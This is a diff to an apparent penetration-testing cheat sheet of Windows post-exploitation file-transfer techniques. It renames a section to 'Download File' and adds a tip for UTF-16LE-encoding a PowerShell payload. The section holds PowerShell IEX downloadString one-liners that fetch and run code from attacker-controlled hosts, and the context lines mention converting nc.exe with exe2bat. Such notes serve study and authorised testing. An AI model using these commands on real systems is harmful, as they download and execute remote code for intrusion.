@@ -114,11 +114,18 @@ Kali> wine exe2bat.exe nc.exe nc.txt
 
 [Sherlock for Powershell](https://github.com/rasta-mouse/Sherlock)
 
-> ###### Upgrade Shell
+> ###### Download File
 
 ```
 C:\> powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1/file.txt')"
 ```
+
+Note: If the above does not work you might need to convert it into **utf-16 little endian** because this is what the Windows OS expects. More here: [UTF-16 is used internally by systems such as Microsoft Windows](https://en.wikipedia.org/wiki/UTF-16)
+
+```
+Kali> echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8000/')" | iconv -t utf-16le
+```
+
 
 > ###### wget
 
